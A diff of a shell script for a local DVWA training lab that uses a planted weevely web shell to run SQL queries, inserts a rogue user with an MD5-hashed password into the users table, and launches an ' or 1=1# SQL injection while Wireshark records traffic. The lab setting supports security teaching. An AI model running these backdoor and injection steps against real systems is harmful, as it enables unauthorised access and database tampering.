@@ -3,6 +3,9 @@
 dvwa_backdoor_url=http://localhost/hackable/uploads/bd.php
 dvwa_backdoor_pass=123
 
+surname=granat
+password=$(echo $surname | md5)
+
 execute_sql_query_weevely()
 {
     docker exec -it kali weevely "$dvwa_backdoor_url" "$dvwa_backdoor_pass" \
@@ -22,16 +25,17 @@ execute_sql_query_weevely \
 # Insert a new user to the DVWA database with password 'user'
 execute_sql_query_weevely \
     ":sql_console -user app -passwd vulnerables -database dvwa -query 
-        'insert into users values(6, \"user\", \"user\", \"user\", 
-        \"ee11cbb19052e40b07aac0ca060c23ee\", \"/hackable/users/admin.jpg\", 
-        \"2024-10-23 20:54:24\", 0);'"
+        'insert into users values(6, \"$surname\", \"$surname\", \"$surname\", 
+        \"$password\", \"/hackable/users/admin.jpg\", 
+        NOW(), 0);'"
 
 # Verify that the new user has been successfully inserted
 execute_sql_query_weevely \
     ":sql_console -user app -passwd vulnerables -database dvwa 
         -query 'select * from users;'"
 
-read -n 1 -s -p "Open Wireshark and start capturing traffic on the lo interface"
+read -n 1 -s -p "Login on http://localhost/login.php, then open Wireshark and \
+start capturing traffic on the lo interface"
 
 # Submit a SQL injection through the web interface
 firefox "http://localhost/vulnerabilities/sqli/?id=1%27+or+1%3D1%23&Submit=Submit"
